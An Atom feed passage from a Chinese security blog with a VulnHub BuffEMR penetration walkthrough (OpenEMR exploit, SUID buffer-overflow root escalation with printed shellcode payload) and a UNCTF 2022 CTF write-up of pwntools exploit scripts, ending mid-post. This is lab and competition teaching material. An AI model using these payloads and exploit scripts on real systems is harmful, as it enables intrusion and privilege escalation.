<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>T君的小屋</title>
  
  
  <link href="http://theffth.github.io/atom.xml" rel="self"/>
  
  <link href="http://theffth.github.io/"/>
  <updated>2022-12-30T10:25:47.465Z</updated>
  <id>http://theffth.github.io/</id>
  
  <author>
    <name>Th3ffth</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>vulnhub-buffemr渗透复现</title>
    <link href="http://theffth.github.io/2022/12/30/vulnhub-buffemr%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/"/>
    <id>http://theffth.github.io/2022/12/30/vulnhub-buffemr%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-12-30T10:20:36.000Z</published>
    <updated>2022-12-30T10:25:47.465Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BuffEMR-缓冲区溢出提权"><a href="#BuffEMR-缓冲区溢出提权" class="headerlink" title="BuffEMR | 缓冲区溢出提权"></a>BuffEMR | 缓冲区溢出提权</h1><p>靶机地址：<a href="https://www.vulnhub.com/entry/buffemr-101,717/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/buffemr-101,717/</a></p><p>环境：VMware 16 Pro、攻击机：Ubuntu 20.04</p><h2 id="主机探活"><a href="#主机探活" class="headerlink" title="主机探活"></a>主机探活</h2><p>靶机网络设置为NAT模式，因此扫描攻击机网段：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221220122918291.png" alt="image-20221220122918291" loading="lazy"></p><p>可知，攻击机ip：192.168.110.129，靶机ip：192.168.110.132</p><h2 id="端口发现"><a href="#端口发现" class="headerlink" title="端口发现"></a>端口发现</h2><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221220123224929.png" alt="image-20221220123224929" loading="lazy"></p><p>发现靶机开放端口为：21、22、80，其中 ftp 服务允许匿名登陆。</p><h3 id="21-端口"><a href="#21-端口" class="headerlink" title="21 端口"></a>21 端口</h3><p>用户名：Anonymous，密码：空，匿名登录 ftp 服务器，查看服务器上的文件：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221220123806169.png" alt="image-20221220123806169" loading="lazy"></p><p>使用命令<code>wget -r ftp://192.168.110.132</code>，把文件全部下载到本地，看到 openemr 的源码，推测 80 端口搭建的是 openemr 的网站，其中 openemr 的各版本漏洞众多。</p><h3 id="80-端口"><a href="#80-端口" class="headerlink" title="80 端口"></a>80 端口</h3><p>尝试访问<code>192.168.110.132/openemr</code>，发现需要登录密码：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221220125004428.png" alt="image-20221220125004428" loading="lazy"></p><p>期望在源码中找到登录密码，查找<code>admin</code>字符串有所收获：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221220125457993.png" alt="image-20221220125457993" loading="lazy"></p><p>尝试用户名：admin，密码：Monster123，成功登录：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221220125748258.png" alt="image-20221220125748258" loading="lazy"></p><p>可以看到 openemr 的版本信息：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221220134640351.png" alt="image-20221220134640351" loading="lazy"></p><p>使用 searchsploit 工具查找相关漏洞：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221220134943433.png" alt="image-20221220134943433" loading="lazy"></p><p><code>cp /opt/exploit-database/exploits/php/webapps/45161.py ./</code>，尝试漏洞利用脚本 45161.py，查看样例命令：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221220174919673.png" alt="image-20221220174919673" loading="lazy"></p><p>执行脚本成功得到靶机的shell：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221220175426774.png" alt="image-20221220175426774" loading="lazy"></p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221220201503985.png" alt="image-20221220201503985" loading="lazy"></p><p>在<code>/var</code>路径下发现可疑文件 user.zip：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221220205522084.png" alt="image-20221220205522084" loading="lazy"></p><p>使用靶机自带 python3 的 http 服务下载这个文件<code>python3 -m http.server 8000</code>：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221220215307153.png" alt="image-20221220215307153" loading="lazy"></p><p>但是发现解压需要密码：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221220215338523.png" alt="image-20221220215338523" loading="lazy"></p><p>接下来，我们需要找到 user.zip 的解压密码，我们尝试查找数据库，在源码的 admin.php 中找到数据库连接函数和相应的配置文件：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221220220057128.png" alt="image-20221220220057128" loading="lazy"></p><p>查找<code>sqlconf.php</code>文件，最终在<code>./share/openemr/sites/default/sqlconf.php</code>文件中看到数据库的用户名和密码：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221220232733641.png" alt="image-20221220232733641" loading="lazy"></p><p>接着我们登录数据库，这里需要先用python生成新的bash进程：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221220232628907.png" alt="image-20221220232628907" loading="lazy"></p><p>看到user_info数据表，查看可以得到一个密码：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221220234306463.png" alt="image-20221220234306463" loading="lazy"></p><p>尝试解压zip成功，并得到ssh连接的密码，并成功连接：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221220234748239.png" alt="image-20221220234748239" loading="lazy"></p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221220234923226.png" alt="image-20221220234923226" loading="lazy"></p><h2 id="提权实现"><a href="#提权实现" class="headerlink" title="提权实现"></a>提权实现</h2><p>在buffemr用户下执行<code>sudo -l</code>，发现该用户不能执行sudo，我们希望能够进一步提权：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221220235656824.png" alt="image-20221220235656824" loading="lazy"></p><p>通过<code>find / -perm -u=s -type f 2&gt;/dev/null</code>查找具有SUID权限的文件，明显看到可疑文件<code>/opt/dontexecute</code>：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221221001446763.png" alt="image-20221221001446763" loading="lazy"></p><p>并且该文件的所有者为 root：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221221001539862.png" alt="image-20221221001539862" loading="lazy"></p><p>我们同样利用python http服务把该文件拖到本地，进行分析：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221221002441774.png" alt="image-20221221002441774" loading="lazy"></p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221221002416671.png" alt="image-20221221002416671" loading="lazy"></p><p>拖入IDA中可以看到程序执行时需要参数，同时发现可疑函数vulnerable：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221221112905737.png" alt="image-20221221112905737" loading="lazy"></p><p>查看 vulnerable 函数，看到缓冲区溢出的危险函数 strcpy() ，并且溢出长度为（0x1FC+4)=0x200：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221221114010647.png" alt="image-20221221114010647" loading="lazy"></p><p>同时，我们看到该文件没有开启 NX 保护机制，因此我们考虑通过注入 shellcode 后利用 ret2shellcode 的方式利用漏洞：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221221115605410.png" alt="image-20221221115605410" loading="lazy"></p><p>此时，程序中只有一个输入点且用户数据输入到栈上，因此我们考虑向栈上注入shellcode，此时需要泄露栈地址，看到程序开启了PIE保护机制，但是该保护机制只有在程序开启ASLR保护才有效，因此我们验证一下靶机的ASLR机制是否开启：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221221121216687.png" alt="image-20221221121216687" loading="lazy"></p><p>看到靶机系统没有开启ASLR机制，即程序每次运行栈都加载到内存的固定地址处，因此在靶机中使用gdb调试，寻找栈地址：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221221152043990.png" alt="image-20221221152043990" loading="lazy"></p><p>其中在 IDA 中可以看到0x6c0是<code>call strcpy()</code>指令的偏移量，在该处下断点可以看到<code>strcpy(dest,src)</code>函数的两个参数，即我们需要的栈地址：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221221155513305.png" alt="image-20221221155513305" loading="lazy"></p><p>验证可以看到这块内存确实存放了我们输入的payload：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221221155605359.png" alt="image-20221221155605359" loading="lazy"></p><p>因此，我们构造攻击payload的思路分成两个步骤：</p><ol><li>向栈中注入shellcode</li><li>利用strcpy()函数栈溢出漏洞劫持程序到我们布置好的shellcode处</li></ol><p>exp如下，其中<code>&#39;\x90&#39;</code>是nop指令的字节码，表示什么都不做的空指令，这里选择的返回地址为0xffffd5d0，shellcode由pwntools工具生成：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221221155845407.png" alt="image-20221221155845407" loading="lazy"></p><p>把脚本的输出：</p><pre><code class="line-numbers language-bash">b&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80\xd0\xd5\xff\xff&#39;</code></pre><p>作为参数攻击靶机程序：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221221160437420.png" alt="image-20221221160437420" loading="lazy"></p><p>可以看到我们能够成功拿到靶机的shell，但是用户仍然为buffemr，没有实现提权，这是因为pwntools工具生成的shellcode仅仅实现getshell的功能，我们在此基础上还需要实现提权。具体如下，由于该文件具有SUID权限，即在程序运行时可以临时获得程序拥有者（root用户）的权限，因此我们可以先调用<code>setuid(0);</code>函数，shellcode如下：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221221164923204.png" alt="image-20221221164923204" loading="lazy"></p><p>再次把脚本输出作为程序参数，成功得到root权限：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221221164846853.png" alt="image-20221221164846853" loading="lazy"></p><p>附：</p><p>Ubuntu 20 安装 searchsploit：</p><pre><code class="line-numbers language-bash">sudo git clone https://gitlab.com/exploit-database/exploitdb.git /opt/exploit-databasesudo ln -sf /opt/exploit-database/searchsploit /usr/local/bin/searchsploit</code></pre><p>参考资料：</p><ol><li><a href="https://www.pudn.com/news/63252cc5b283a472d02574c9.html" target="_blank" rel="noopener">https://www.pudn.com/news/63252cc5b283a472d02574c9.html</a></li><li><a href="https://www.cnblogs.com/sainet/p/15723598.html" target="_blank" rel="noopener">https://www.cnblogs.com/sainet/p/15723598.html</a></li><li><a href="https://www.bilibili.com/video/BV1dS4y1e7aA/?spm_id_from=333.788&amp;vd_source=d98804780bfb6a9fe5886937a5d2b0e6" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1dS4y1e7aA/?spm_id_from=333.788&amp;vd_source=d98804780bfb6a9fe5886937a5d2b0e6</a></li></ol>]]></content>
    
    
    <summary type="html">vulnhub-buffemr靶机渗透复现 | 利用缓冲区溢出漏洞提权</summary>
    
    
    
    <category term="漏洞分析" scheme="http://theffth.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="渗透" scheme="http://theffth.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>2022UNCTF WP</title>
    <link href="http://theffth.github.io/2022/12/29/2022UNCTF-WP/"/>
    <id>http://theffth.github.io/2022/12/29/2022UNCTF-WP/</id>
    <published>2022-12-29T11:38:19.000Z</published>
    <updated>2022-12-30T10:17:32.426Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2022UNCTF-WP"><a href="#2022UNCTF-WP" class="headerlink" title="2022UNCTF - WP"></a>2022UNCTF - WP</h1><p>11月份混了一下校内赛，我还是一如既往的菜哇T^T~</p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="welcomeUNCTF2022-云南警官学院"><a href="#welcomeUNCTF2022-云南警官学院" class="headerlink" title="welcomeUNCTF2022-云南警官学院"></a>welcomeUNCTF2022-云南警官学院</h3><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221113104410970.png" alt="" loading="lazy"></p><h3 id="石头剪刀布-西华大学"><a href="#石头剪刀布-西华大学" class="headerlink" title="石头剪刀布-西华大学"></a>石头剪刀布-西华大学</h3><pre><code class="line-numbers language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;//0:rock 1:scissor 2:paperint main(){    srand(10);    int i;    int r[100]={0};    int tmp;    for(i=0;i&lt;100;i++){        tmp=rand()%3;        //1-&gt;0,0-&gt;2,2-&gt;1        if(tmp==1) r[i]=0;        else if(tmp==0) r[i]=2;        else r[i]=1;    }    for(i=0;i&lt;100;i++) printf(&quot;%d&quot;,r[i]);    return 0;}</code></pre><pre><code class="line-numbers language-python">from pwn import *#from LibcSearcher import LibcSearchercontext(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;)local=0binary_name=&#39;game&#39;if local:    p=process(&#39;./&#39;+binary_name)    e=ELF(&#39;./&#39;+binary_name)    libc=e.libcelse:    p=remote(&quot;node.yuzhian.com.cn&quot;,34799)    e=ELF(&#39;./&#39;+binary_name)    libc=ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)def z(a=&#39;&#39;):    if local:        gdb.attach(p,a)        if a==&#39;&#39;:            raw_input    else:        passru=lambda x:p.recvuntil(x)sl=lambda x:p.sendline(x)sd=lambda x:p.send(x)sla=lambda a,b:p.sendlineafter(a,b)ia=lambda :p.interactive()def leak_address():    if(context.arch==&#39;i386&#39;):        return u32(p.recv(4))    else :        return u64(p.recv(6).ljust(8,b&#39;\x00&#39;))str=&quot;0011211011112210201220000100022120122021010120002212101022110010111102121220111220202212022100002001&quot;sla(&quot;Will you learn about something of pwn later?(y/n)&quot;,b&#39;y&#39;)for i in range(0,100):    sla(&quot;\x1B[0m\n&quot;,str[i])p.interactive()</code></pre><h3 id="move-your-heart-中国计量大学现代科技学院"><a href="#move-your-heart-中国计量大学现代科技学院" class="headerlink" title="move your heart-中国计量大学现代科技学院"></a>move your heart-中国计量大学现代科技学院</h3><pre><code class="line-numbers language-python">from pwn import *#from LibcSearcher import LibcSearchercontext(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;)local=0binary_name=&#39;move&#39;if local:    p=process(&#39;./&#39;+binary_name)    e=ELF(&#39;./&#39;+binary_name)    libc=e.libcelse:    p=remote(&quot;node.yuzhian.com.cn&quot;,32533)    e=ELF(&#39;./&#39;+binary_name)    libc=ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)def z(a=&#39;&#39;):    if local:        gdb.attach(p,a)        if a==&#39;&#39;:            raw_input    else:        passru=lambda x:p.recvuntil(x)sl=lambda x:p.sendline(x)sd=lambda x:p.send(x)sla=lambda a,b:p.sendlineafter(a,b)ia=lambda :p.interactive()def leak_address():    if(context.arch==&#39;i386&#39;):        return u32(p.recv(4))    else :        return u64(p.recv(6).ljust(8,&#39;\x00&#39;))z(&quot;b main&quot;)sla(&quot;input a num:&quot;,&quot;286129175&quot;)p.recvuntil(&quot;gift:&quot;)pause()leak_addr=int(p.recv(14),16)print(hex(leak_addr))system=0x4010D0bin_sh=leak_addr+0x18pop_rdi_ret=0x4013d3leave_ret=0x4012D6pd=p64(pop_rdi_ret)+p64(bin_sh)+p64(system)+b&quot;/bin/sh;&quot;+p64(leak_addr-8)+p64(leave_ret)sd(pd)p.interactive()</code></pre><h3 id="checkin-珠海科技学院"><a href="#checkin-珠海科技学院" class="headerlink" title="checkin-珠海科技学院"></a>checkin-珠海科技学院</h3><pre><code class="line-numbers language-python">from pwn import *#from LibcSearcher import LibcSearchercontext(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;)local=0binary_name=&#39;checkin&#39;if local:    p=process(&#39;./&#39;+binary_name)    e=ELF(&#39;./&#39;+binary_name)    libc=e.libcelse:    p=remote(&quot;node.yuzhian.com.cn&quot;, 34258)    e=ELF(&#39;./&#39;+binary_name)    libc=ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)def z(a=&#39;&#39;):    if local:        gdb.attach(p,a)        if a==&#39;&#39;:            raw_input    else:        passru=lambda x:p.recvuntil(x)sl=lambda x:p.sendline(x)sd=lambda x:p.send(x)sla=lambda a,b:p.sendlineafter(a,b)ia=lambda :p.interactive()def leak_address():    if(context.arch==&#39;i386&#39;):        return u32(p.recv(4))    else :        return u64(p.recv(6).ljust(8,&#39;\x00&#39;))sla(&quot;name: &quot;,&quot;aa&quot;)sla(&quot;Please input size: &quot;,&quot; -1&quot;)sl(b&#39;a&#39;*0x100)p.interactive()</code></pre><h3 id="int-0x80-中国计量大学现代科技学院"><a href="#int-0x80-中国计量大学现代科技学院" class="headerlink" title="int 0x80-中国计量大学现代科技学院"></a>int 0x80-中国计量大学现代科技学院</h3><p>谷歌<code>__ctype_b_loc</code>可知需要可打印字符，</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221116094606350.png" alt="" loading="lazy"></p><p>注入64位可打印shellcode即可：</p><pre><code class="line-numbers language-python">from pwn import *#from LibcSearcher import LibcSearchercontext(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;)local=0binary_name=&#39;int0x80&#39;if local:    p=process(&#39;./&#39;+binary_name)    e=ELF(&#39;./&#39;+binary_name)    libc=e.libcelse:    p=remote(&quot;node.yuzhian.com.cn&quot;,30592)    e=ELF(&#39;./&#39;+binary_name)    libc=ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)def z(a=&#39;&#39;):    if local:        gdb.attach(p,a)        if a==&#39;&#39;:            raw_input    else:        passru=lambda x:p.recvuntil(x)sl=lambda x:p.sendline(x)sd=lambda x:p.send(x)sla=lambda a,b:p.sendlineafter(a,b)ia=lambda :p.interactive()def leak_address():    if(context.arch==&#39;i386&#39;):        return u32(p.recv(4))    else :        return u64(p.recv(6).ljust(8,&#39;\x00&#39;))z()shellcode=shellcraft.sh()ru(&quot;hello pwn\n&quot;)#pause() sd(&quot;Vh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;)p.interactive()</code></pre><p>这里用了alpha3工具（<a href="https://github.com/TaQini/alpha3），但是我用自己生成的shellcode作为输入跑不通，使用工具的才行emmm，暂时还不清楚原因" target="_blank" rel="noopener">https://github.com/TaQini/alpha3），但是我用自己生成的shellcode作为输入跑不通，使用工具的才行emmm，暂时还不清楚原因</a></p><h3 id="fakehero-西华大学"><a href="#fakehero-西华大学" class="headerlink" title="fakehero-西华大学"></a>fakehero-西华大学</h3><pre><code class="line-numbers language-python">from pwn import *#from LibcSearcher import LibcSearchercontext(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;)local=0binary_name=&#39;prog&#39;if local:    p=process(&#39;./&#39;+binary_name)    e=ELF(&#39;./&#39;+binary_name)    libc=e.libcelse:    p=remote(&quot;node.yuzhian.com.cn&quot;,38527)    e=ELF(&#39;./&#39;+binary_name)    libc=ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)def z(a=&#39;&#39;):    if local:        gdb.attach(p,a)        if a==&#39;&#39;:            raw_input    else:        passru=lambda x:p.recvuntil(x)sl=lambda x:p.sendline(x)sd=lambda x:p.send(x)sla=lambda a,b:p.sendlineafter(a,b)ia=lambda :p.interactive()def leak_address():    if(context.arch==&#39;i386&#39;):        return u32(p.recv(4))    else :        return u64(p.recv(6).ljust(8,b&#39;\x00&#39;))def menu(cho):    ru(&quot;&gt; &quot;)    sl(str(cho))def add(idx,size,content):    menu(1)    sla(&quot;index: \n&quot;,str(idx))    sla(&quot;Size: \n&quot;,str(size))    ru(&quot;Content: &quot;)    sd(content)def delete(idx):    menu(2)    sla(&quot;Index: \n&quot;,str(idx))#z()shellcode=asm(shellcraft.sh())add(0x9,0x100,shellcode)menu(3)p.interactive()</code></pre><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="whereisyourkey-广东海洋大学"><a href="#whereisyourkey-广东海洋大学" class="headerlink" title="whereisyourkey-广东海洋大学"></a>whereisyourkey-广东海洋大学</h3><pre><code class="line-numbers language-C">#include &lt;stdio.h&gt;int main(){    int v5[10] = {&#39;v&#39;, &#39;g&#39;, &#39;p&#39;, &#39;k&#39;, &#39;c&#39;, &#39;m&#39;, &#39;h&#39;, &#39;n&#39;, &#39;c&#39;, &#39;i&#39;};    int i;    for (i = 0; i &lt; 10; i++)    {        if (v5[i] == &#39;m&#39;)            v5[i] = &#39;m&#39;;        else if (v5[i] &lt;= &#39;o&#39;)        {            if (v5[i] &lt;= &#39;n&#39;)                v5[i] -= 2;        }        else        {            v5[i] += 3;        }    }    for (i = 0; i &lt; 10; i++)    {        printf(&quot;%c&quot;, v5[i]);    }    return 0;}</code></pre><h3 id="ezzzzre-广东海洋大学"><a href="#ezzzzre-广东海洋大学" class="headerlink" title="ezzzzre-广东海洋大学"></a>ezzzzre-广东海洋大学</h3><p>先upx脱壳，看到程序逻辑：</p><pre><code class="line-numbers language-C">#include &lt;stdio.h&gt;int main(){    char s[8]={&quot;HELLOCTF&quot;};    char flag[8]={0};    int i;    for(i=0;i&lt;8;i++){        flag[i]=2*s[i]-69;    }    for(i=0;i&lt;8;i++){        printf(&quot;%c&quot;,flag[i]);    }    return 0;}</code></pre><h3 id="Sudoku-陆军工程大学"><a href="#Sudoku-陆军工程大学" class="headerlink" title="Sudoku-陆军工程大学"></a>Sudoku-陆军工程大学</h3><p>程序要求我们的输入与v12数组中的值相同：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117140803200.png" alt="" loading="lazy"></p><p>动调到输入之前，在栈中找到v12的数据：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117140458328.png" alt="" loading="lazy"></p><p>输入后的到flag：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117135322609.png" alt="" loading="lazy"></p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117141106499.png" alt="" loading="lazy"></p><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="md5-1-西南科技大学"><a href="#md5-1-西南科技大学" class="headerlink" title="md5-1-西南科技大学"></a>md5-1-西南科技大学</h3><p>找个在线网站批量解密即可~</p><h3 id="dddd-西南科技大学"><a href="#dddd-西南科技大学" class="headerlink" title="dddd-西南科技大学"></a>dddd-西南科技大学</h3><pre><code class="line-numbers language-python">str=&quot;110/01/0101/0/1101/0000100/0100/11110/111/110010/0/1111/10000/111/110010/1000/110/111/0/110010/00/00000/101/111/1/0000010&quot;r=&#39;&#39;for i in range(len(str)):    if str[i]==&#39;1&#39;:        r+=&#39;.&#39;    elif str[i]==&#39;0&#39;:        r+=&#39;-&#39;    else :        r+=&#39; &#39;print(r)</code></pre><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118142655886.png" alt="" loading="lazy"></p><h3 id="caesar-西南科技大学"><a href="#caesar-西南科技大学" class="headerlink" title="caesar-西南科技大学"></a>caesar-西南科技大学</h3><p>在网上找的代码：</p><pre><code class="line-numbers language-python"># Caeser Cipher  import sys,os  MyCypher = 25 MyDict = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#39; plaintext = &#39;Hello World!&#39; cryptmsg = &#39;&#39;  def encrypt(text, cypher):      out_text = &#39;&#39;      for e in text:          x = e          if (e in MyDict):              idx = MyDict.find(e)              idx = idx + cypher              idx = idx % len(MyDict)              x = MyDict[idx]          out_text = &quot;%s%c&quot; % (out_text, x)      return out_text  def decrypt(msg, cypher):      out_text = &#39;&#39;      for e in msg:          x = e          if (e in MyDict):              idx = MyDict.find(e)              idx = idx - cypher + len(MyDict)              idx = idx % len(MyDict)              x = MyDict[idx]          out_text = &quot;%s%c&quot; % (out_text, x)      return out_text  def ask_cypher():      user_input = raw_input(&#39;Input Cypher: &#39;)      return long(user_input)  def ask_text():      user_input = raw_input(&#39;Input Text: &#39;)      return user_input  def ask_action():      print &#39;-----------------------&#39;     print &#39;0 - Exit&#39;     print &#39;1 - Encrypt&#39;     print &#39;2 - Decrypt&#39;     print &#39;-----------------------&#39;     user_input = raw_input(&#39;Select You Action: &#39;)      if user_input in [&#39;0&#39;, &#39;1&#39;, &#39;2&#39;]:          if user_input == &#39;0&#39;:              return &#39;exit&#39;         elif user_input == &#39;1&#39;:              return &#39;enc&#39;         elif user_input == &#39;2&#39;:              return &#39;dec&#39;     else:          return &#39;exit&#39; # ---------------------------------------------------------------  # Program Start Here  # ---------------------------------------------------------------  MyCypher = ask_cypher()  print &#39;Cypher: %d&#39; % MyCypher  for i in range(0, 100):      action = ask_action()      if action == &#39;dec&#39;:          cryptmsg = ask_text()          print decrypt(cryptmsg, MyCypher)      elif action == &#39;enc&#39;:          plaintext = ask_text()          print encrypt(plaintext, MyCypher)      else:          print &#39;Exit!&#39;         break</code></pre><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221116165624834.png" alt="" loading="lazy"></p><h3 id="md5-2-西南科技大学"><a href="#md5-2-西南科技大学" class="headerlink" title="md5-2-西南科技大学"></a>md5-2-西南科技大学</h3><pre><code class="line-numbers 